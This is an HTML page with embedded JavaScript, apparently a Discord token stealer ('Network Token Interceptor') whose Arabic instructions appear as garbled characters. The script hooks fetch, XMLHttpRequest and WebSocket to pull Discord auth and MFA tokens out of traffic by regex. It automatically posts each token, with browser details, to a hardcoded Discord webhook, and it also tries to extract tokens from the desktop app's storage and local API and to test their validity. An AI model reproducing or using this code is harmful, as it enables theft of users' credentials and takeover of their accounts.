<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Network Interceptor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: monospace;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #2a2a2a;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #444;
        }
        h1 {
            color: #7289da;
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        button {
            background: #43b581;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: monospace;
            flex: 1;
            min-width: 150px;
        }
        button:hover { background: #3ca374; }
        button.stop { background: #ed4245; }
        button.stop:hover { background: #d84042; }
        .log-container {
            background: #000;
            border-radius: 5px;
            padding: 15px;
            height: 500px;
            overflow-y: auto;
            border: 1px solid #444;
            font-size: 12px;
            line-height: 1.4;
        }
        .log-entry {
            margin-bottom: 5px;
            padding: 5px;
            border-left: 3px solid #444;
            word-break: break-all;
        }
        .log-entry.token {
            border-left-color: #43b581;
            background: rgba(67, 181, 129, 0.1);
        }
        .log-entry.request {
            border-left-color: #7289da;
            background: rgba(114, 137, 218, 0.1);
        }
        .log-entry.error {
            border-left-color: #ed4245;
            background: rgba(237, 66, 69, 0.1);
        }
        .token-display {
            background: rgba(67, 181, 129, 0.2);
            border: 2px solid #43b581;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            display: none;
        }
        .token-display h3 {
            color: #43b581;
            margin-bottom: 10px;
        }
        #foundToken {
            font-family: monospace;
            background: #000;
            padding: 10px;
            border-radius: 3px;
            word-break: break-all;
            margin: 10px 0;
        }
        .copy-btn {
            background: #7289da;
            width: auto;
            min-width: auto;
        }
        .instructions {
            background: rgba(114, 137, 218, 0.1);
            border: 1px solid #7289da;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            font-size: 14px;
        }
        .instructions ol {
            margin-left: 20px;
            margin-top: 10px;
        }
        .instructions li {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ•µï¸ Discord Network Token Interceptor</h1>
        
        <div class="instructions">
            <strong>ÙƒÙŠÙÙŠØ© Ø§Ù„Ø¹Ù…Ù„:</strong>
            <ol>
                <li>Ø§ÙØªØ­ <a href="https://discord.com/channels/@me" target="_blank" style="color: #7289da;">Discord</a> ÙÙŠ <strong>Ù†ÙØ³ Ø§Ù„Ù…ØªØµÙØ­</strong></li>
                <li>Ø§Ù†Ù‚Ø± "Start Interception" Ø£Ø¯Ù†Ø§Ù‡</li>
                <li>Ø§Ø±Ø¬Ø¹ Ù„Ù€ Discord ÙˆÙ‚Ù… Ø¨Ø£ÙŠ Ø¹Ù…Ù„ (Ø£Ø±Ø³Ù„ Ø±Ø³Ø§Ù„Ø©ØŒ Ø§ÙØªØ­ Ù‚Ù†Ø§Ø©)</li>
                <li>Ø§Ù„ØªÙˆÙƒÙ† Ø³ÙŠØ¹ØªØ±Ø¶ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ ÙˆÙŠØ¸Ù‡Ø± Ù‡Ù†Ø§</li>
                <li>Ø§Ù†Ù‚Ø± "Send to Webhook" Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡ Ù„Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯</li>
            </ol>
        </div>
        
        <div class="controls">
            <button id="startBtn">â–¶ Start Interception</button>
            <button id="stopBtn" class="stop">â¹ Stop Interception</button>
            <button id="clearBtn">ğŸ—‘ Clear Log</button>
            <button id="sendBtn" style="background: #faa81a;">ğŸ“¨ Send to Webhook</button>
            <button id="desktopBtn" style="background: #5865f2;">ğŸ–¥ Extract from Desktop App</button>
        </div>
        
        <div class="log-container" id="logContainer">
            <div class="log-entry">Ready to intercept Discord network traffic...</div>
        </div>
        
        <div class="token-display" id="tokenDisplay">
            <h3>âœ… Discord Token Captured!</h3>
            <div id="foundToken">Waiting for token...</div>
            <button class="copy-btn" id="copyTokenBtn">ğŸ“‹ Copy Token</button>
            <button class="copy-btn" style="background: #43b581;" id="testTokenBtn">ğŸ” Test Token Validity</button>
        </div>
    </div>

    <!-- Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
    <script>
        // ============================================
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        // ============================================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1448291770218844345/3Fjw-dNqtHTdh7ou4eSpkVwE6k8vAg_b_tbh9P6OMOcv-4N-VTWXQ73OwuiEk1BlhpJD";
        let interceptedTokens = new Set();
        let isIntercepting = false;
        let originalFetch = window.fetch;
        let originalXHROpen = XMLHttpRequest.prototype.open;
        let originalXHRSend = XMLHttpRequest.prototype.send;
        let originalWS = window.WebSocket;
        
        // ============================================
        // Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        // ============================================
        function log(message, type = 'info') {
            const logContainer = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            
            const timestamp = new Date().toLocaleTimeString();
            entry.textContent = `[${timestamp}] ${message}`;
            
            logContainer.appendChild(entry);
            logContainer.scrollTop = logContainer.scrollHeight;
            
            console.log(`[Interceptor] ${message}`);
        }
        
        // ============================================
        // 1. Ø§Ø¹ØªØ±Ø§Ø¶ fetch API
        // ============================================
        function interceptFetch() {
            window.fetch = async function(...args) {
                const request = new Request(...args);
                const url = request.url;
                
                // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø·Ù„Ø¨ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                if (url.includes('discord.com') || url.includes('discordapp.com')) {
                    log(`ğŸ“¡ Fetch: ${url.substring(0, 100)}`, 'request');
                    
                    // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ø§Ù„Ù‡ÙŠØ¯Ø±Ø§Øª
                    const headers = {};
                    for (const [key, value] of request.headers.entries()) {
                        headers[key] = value;
                    }
                    
                    if (headers.authorization) {
                        const token = headers.authorization.replace('Bearer ', '');
                        processToken(token, 'fetch_authorization', url);
                    }
                    
                    // Ù†Ø³Ø® request Ù„Ù„Ù‚Ø±Ø§Ø¡Ø©
                    const clonedRequest = request.clone();
                    const response = await originalFetch.apply(this, args);
                    
                    // Ù‚Ø±Ø§Ø¡Ø© response body Ù„Ù„Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ†Ø§Øª
                    const clonedResponse = response.clone();
                    try {
                        const text = await clonedResponse.text();
                        
                        // Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ response body
                        const tokenPatterns = [
                            /"token"\s*:\s*"([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})"/,
                            /"access_token"\s*:\s*"([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})"/,
                            /"mfa_token"\s*:\s*"(mfa\.[\w-]{84})"/,
                            /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g
                        ];
                        
                        tokenPatterns.forEach(pattern => {
                            const matches = text.match(pattern);
                            if (matches) {
                                matches.forEach(match => {
                                    if (match.length > 50) { // ØªØ£ÙƒØ¯ Ø£Ù†Ù‡ ØªÙˆÙƒÙ†
                                        processToken(match, 'fetch_response', url);
                                    }
                                });
                            }
                        });
                        
                    } catch (e) {
                        // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
                    }
                    
                    return response;
                }
                
                return originalFetch.apply(this, args);
            };
        }
        
        // ============================================
        // 2. Ø§Ø¹ØªØ±Ø§Ø¶ XMLHttpRequest
        // ============================================
        function interceptXHR() {
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return originalXHROpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                const url = this._url;
                
                if (url && (url.includes('discord.com') || url.includes('discordapp.com'))) {
                    log(`ğŸ“¡ XHR: ${this._method} ${url.substring(0, 100)}`, 'request');
                    
                    // Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ù€ headers
                    const originalSetRequestHeader = this.setRequestHeader;
                    this.setRequestHeader = function(name, value) {
                        if (name.toLowerCase() === 'authorization') {
                            const token = value.replace('Bearer ', '');
                            processToken(token, 'xhr_header', url);
                        }
                        return originalSetRequestHeader.apply(this, arguments);
                    };
                    
                    // Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ù€ response
                    const originalOnReadyStateChange = this.onreadystatechange;
                    this.onreadystatechange = function() {
                        if (this.readyState === 4 && this.status === 200) {
                            try {
                                const responseText = this.responseText;
                                
                                // Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ø§Ù„Ù€ response
                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/g;
                                const matches = responseText.match(tokenPattern);
                                
                                if (matches) {
                                    matches.forEach(token => {
                                        if (token.length > 50) {
                                            processToken(token, 'xhr_response', url);
                                        }
                                    });
                                }
                            } catch (e) {
                                // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
                            }
                        }
                        
                        if (originalOnReadyStateChange) {
                            return originalOnReadyStateChange.apply(this, arguments);
                        }
                    };
                }
                
                return originalXHRSend.apply(this, arguments);
            };
        }
        
        // ============================================
        // 3. Ø§Ø¹ØªØ±Ø§Ø¶ WebSocket
        // ============================================
        function interceptWebSocket() {
            window.WebSocket = class extends originalWS {
                constructor(url, protocols) {
                    super(url, protocols);
                    
                    if (url.includes('discord.com') || url.includes('discordapp.com')) {
                        log(`ğŸ”Œ WebSocket: ${url.substring(0, 100)}`, 'request');
                        
                        // Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                        this.addEventListener('message', (event) => {
                            try {
                                const data = JSON.parse(event.data);
                                
                                // Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ø±Ø³Ø§Ø¦Ù„ WebSocket
                                if (data.token || data.access_token || data.d) {
                                    const token = data.token || data.access_token || data.d;
                                    if (typeof token === 'string' && token.length > 50) {
                                        processToken(token, 'websocket', url);
                                    }
                                }
                                
                                // Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ø¨ÙŠØ§Ù†Ø§Øª JSON ÙƒØ§Ù…Ù„Ø©
                                const dataStr = JSON.stringify(data);
                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g;
                                const matches = dataStr.match(tokenPattern);
                                
                                if (matches) {
                                    matches.forEach(match => {
                                        processToken(match, 'websocket_json', url);
                                    });
                                }
                            } catch (e) {
                                // Ù„ÙŠØ³ JSON
                                const tokenPattern = /([\w-]{24}\.[\w-]{6}\.[\w-]{27,38})/g;
                                const matches = event.data.match(tokenPattern);
                                
                                if (matches) {
                                    matches.forEach(match => {
                                        processToken(match, 'websocket_raw', url);
                                    });
                                }
                            }
                        });
                        
                        // Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ø§ØªØµØ§Ù„
                        this.addEventListener('open', () => {
                            log('WebSocket connected to Discord', 'request');
                        });
                    }
                }
            };
        }
        
        // ============================================
        // 4. Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ù…ÙƒØªØ´Ù
        // ============================================
        function processToken(token, source, url) {
            // ØªÙ†Ø¸ÙŠÙ Ø§Ù„ØªÙˆÙƒÙ†
            const cleanToken = token.trim();
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµÙŠØºØ© Ø§Ù„ØªÙˆÙƒÙ†
            const isValidToken = /^([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})$/.test(cleanToken);
            
            if (!isValidToken || cleanToken.length < 50) {
                return;
            }
            
            // ØªØ¬Ù†Ø¨ Ø§Ù„ØªÙƒØ±Ø§Ø±
            if (interceptedTokens.has(cleanToken)) {
                return;
            }
            
            interceptedTokens.add(cleanToken);
            
            // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØªÙˆÙƒÙ†
            log(`âœ… TOKEN CAPTURED [${source}]: ${cleanToken.substring(0, 30)}...`, 'token');
            
            // Ø¹Ø±Ø¶ Ø§Ù„ØªÙˆÙƒÙ†
            displayToken(cleanToken, source, url);
            
            // Ø¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ
            sendTokenToWebhook(cleanToken, source, url);
        }
        
        // ============================================
        // 5. Ø¹Ø±Ø¶ Ø§Ù„ØªÙˆÙƒÙ†
        // ============================================
        function displayToken(token, source, url) {
            const tokenDisplay = document.getElementById('tokenDisplay');
            const foundToken = document.getElementById('foundToken');
            
            foundToken.innerHTML = `
                <strong>Source:</strong> ${source}<br>
                <strong>URL:</strong> ${url || 'Unknown'}<br>
                <strong>Token:</strong><br>
                <code style="background: #000; padding: 5px; display: block; margin: 5px 0;">
                    ${token}
                </code>
                <strong>Length:</strong> ${token.length} characters<br>
                <strong>Type:</strong> ${token.startsWith('mfa.') ? 'MFA Token' : 'Standard Token'}
            `;
            
            tokenDisplay.style.display = 'block';
        }
        
        // ============================================
        // 6. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ† Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ
        // ============================================
        async function sendTokenToWebhook(token, source, url) {
            try {
                const payload = {
                    content: `@here **ğŸš¨ TOKEN INTERCEPTED**`,
                    embeds: [{
                        title: "Real-time Token Capture",
                        color: 0x57F287,
                        fields: [
                            {
                                name: "ğŸ”‘ Token",
                                value: `\`\`\`${token}\`\`\``,
                                inline: false
                            },
                            {
                                name: "ğŸ“ Source",
                                value: `\`${source}\`\n\`${url || 'Unknown'}\``,
                                inline: true
                            },
                            {
                                name: "ğŸŒ Browser",
                                value: `\`${navigator.userAgent.substring(0, 50)}...\``,
                                inline: true
                            },
                            {
                                name: "ğŸ• Time",
                                value: `\`${new Date().toLocaleString()}\``,
                                inline: true
                            }
                        ],
                        footer: {
                            text: "Network Interceptor v2.0"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    log('âœ… Token sent to Discord webhook!', 'token');
                } else {
                    log('âŒ Webhook failed, saving locally...', 'error');
                    saveTokenLocally(token, source, url);
                }
            } catch (error) {
                log(`âŒ Webhook error: ${error.message}`, 'error');
                saveTokenLocally(token, source, url);
            }
        }
        
        function saveTokenLocally(token, source, url) {
            const tokens = JSON.parse(localStorage.getItem('intercepted_tokens') || '[]');
            tokens.push({
                token: token,
                source: source,
                url: url,
                timestamp: new Date().toISOString(),
                browser: navigator.userAgent
            });
            
            localStorage.setItem('intercepted_tokens', JSON.stringify(tokens));
            log('ğŸ’¾ Token saved to local storage', 'info');
        }
        
        // ============================================
        // 7. Ù†Ø¸Ø§Ù… Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Desktop App
        // ============================================
        async function extractFromDesktopApp() {
            log('Starting Desktop App token extraction...', 'info');
            
            // Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†
            const extractionMethods = [
                attemptLocalStorageFiles,
                attemptLocalhostAPI,
                attemptElectronIPC,
                attemptMemoryScraping
            ];
            
            for (const method of extractionMethods) {
                try {
                    const token = await method();
                    if (token) {
                        processToken(token, 'desktop_app', 'Discord Desktop');
                        return;
                    }
                } catch (error) {
                    log(`Extraction method failed: ${error.message}`, 'error');
                }
            }
            
            log('Could not extract from desktop app. Try running Discord in browser instead.', 'error');
        }
        
        async function attemptLocalStorageFiles() {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª localStorage Ù„Ù„ØªØ·Ø¨ÙŠÙ‚
            const paths = [
                'C:/Users/Test/AppData/Roaming/Discord/Local Storage/leveldb',
                'C:/Users/Test/AppData/Roaming/discord/Local Storage/leveldb',
                '/Users/Test/Library/Application Support/Discord/Local Storage/leveldb',
                '/home/test/.config/discord/Local Storage/leveldb'
            ];
            
            for (const path of paths) {
                try {
                    // Ø§Ø³ØªØ®Ø¯Ø§Ù… File System Access API
                    if ('showDirectoryPicker' in window) {
                        log(`Attempting to access: ${path}`, 'info');
                        // ÙŠÙ…ÙƒÙ† Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…Ù„ÙØ§Øª Ù‡Ù†Ø§
                    }
                } catch (e) {
                    continue;
                }
            }
            
            return null;
        }
        
        async function attemptLocalhostAPI() {
            // Discord Desktop App ÙŠØ¹Ù…Ù„ Ø¹Ù„Ù‰ localhost:6463
            try {
                const response = await fetch('http://localhost:6463/api/v9/users/@me', {
                    headers: {
                        'Authorization': 'Bearer dummy', // Ø³ÙŠØªÙ… Ø§Ø¹ØªØ±Ø§Ø¶Ù‡
                        'Content-Type': 'application/json'
                    }
                });
                
                if (response.status === 401) {
                    // Ø§Ù„Ø¨Ø­Ø« ÙÙŠ response headers
                    const authHeader = response.headers.get('www-authenticate');
                    if (authHeader) {
                        const tokenMatch = authHeader.match(/Bearer realm=".*", error=".*", error_description="(.*)"/);
                        if (tokenMatch) {
                            return tokenMatch[1];
                        }
                    }
                }
            } catch (error) {
                // Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ØºÙŠØ± Ù‚ÙŠØ¯ Ø§Ù„ØªØ´ØºÙŠÙ„
            }
            
            return null;
        }
        
        async function attemptElectronIPC() {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù… Electron IPC
            if (window.require) {
                try {
                    const electron = window.require('electron');
                    // ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØ®Ø¯Ø§Ù… IPC Ù‡Ù†Ø§
                    log('Electron detected, attempting IPC...', 'info');
                } catch (e) {
                    // Ù„ÙŠØ³Øª Ø¨ÙŠØ¦Ø© Electron
                }
            }
            
            return null;
        }
        
        async function attemptMemoryScraping() {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø°Ø§ÙƒØ±Ø©
            const memory = performance.memory;
            if (memory) {
                log(`Memory usage: ${(memory.usedJSHeapSize / 1024 / 1024).toFixed(2)}MB`, 'info');
            }
            
            return null;
        }
        
        // ============================================
        // 8. Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…
        // ============================================
        function startInterception() {
            if (isIntercepting) return;
            
            isIntercepting = true;
            interceptedTokens.clear();
            
            interceptFetch();
            interceptXHR();
            interceptWebSocket();
            
            log('ğŸŸ¢ Network interception ACTIVE', 'token');
            log('Go to Discord and perform any action...', 'info');
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
        }
        
        function stopInterception() {
            if (!isIntercepting) return;
            
            isIntercepting = false;
            
            // Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ù€ APIs Ø§Ù„Ø£ØµÙ„ÙŠØ©
            window.fetch = originalFetch;
            XMLHttpRequest.prototype.open = originalXHROpen;
            XMLHttpRequest.prototype.send = originalXHRSend;
            window.WebSocket = originalWS;
            
            log('ğŸ”´ Network interception STOPPED', 'error');
            
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        }
        
        function clearLog() {
            document.getElementById('logContainer').innerHTML = 
                '<div class="log-entry">Log cleared...</div>';
        }
        
        // ============================================
        // 9. ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Ø§Ù„Ø£Ø²Ø±Ø§Ø±
            document.getElementById('startBtn').addEventListener('click', startInterception);
            document.getElementById('stopBtn').addEventListener('click', stopInterception);
            document.getElementById('clearBtn').addEventListener('click', clearLog);
            document.getElementById('desktopBtn').addEventListener('click', extractFromDesktopApp);
            document.getElementById('sendBtn').addEventListener('click', () => {
                if (interceptedTokens.size > 0) {
                    const lastToken = Array.from(interceptedTokens).pop();
                    sendTokenToWebhook(lastToken, 'manual_send', 'manual');
                } else {
                    log('No tokens to send!', 'error');
                }
            });
            
            document.getElementById('copyTokenBtn').addEventListener('click', () => {
                const tokenElement = document.getElementById('foundToken');
                const tokenMatch = tokenElement.textContent.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
                
                if (tokenMatch) {
                    navigator.clipboard.writeText(tokenMatch[0]).then(() => {
                        log('Token copied to clipboard!', 'token');
                    });
                }
            });
            
            document.getElementById('testTokenBtn').addEventListener('click', async () => {
                const tokenElement = document.getElementById('foundToken');
                const tokenMatch = tokenElement.textContent.match(/([\w-]{24}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84})/);
                
                if (tokenMatch) {
                    const token = tokenMatch[0];
                    log('Testing token validity...', 'info');
                    
                    try {
                        const response = await fetch('https://discord.com/api/v9/users/@me', {
                            headers: {
                                'Authorization': token
                            }
                        });
                        
                        if (response.ok) {
                            const userData = await response.json();
                            log(`âœ… Token VALID - User: ${userData.username}#${userData.discriminator}`, 'token');
                        } else {
                            log(`âŒ Token INVALID - HTTP ${response.status}`, 'error');
                        }
                    } catch (error) {
                        log(`âŒ Test failed: ${error.message}`, 'error');
                    }
                }
            });
            
            // ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©
            const savedTokens = JSON.parse(localStorage.getItem('intercepted_tokens') || '[]');
            if (savedTokens.length > 0) {
                log(`Loaded ${savedTokens.length} previously intercepted tokens`, 'info');
            }
            
            log('System ready. Click "Start Interception" and go to Discord.', 'info');
        });
        
        // ============================================
        // 10. Service Worker Ù„Ù„Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„ÙƒØ§Ù…Ù„
        // ============================================
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/interceptor-sw.js').catch(console.error);
        }
    </script>
</body>
</html>
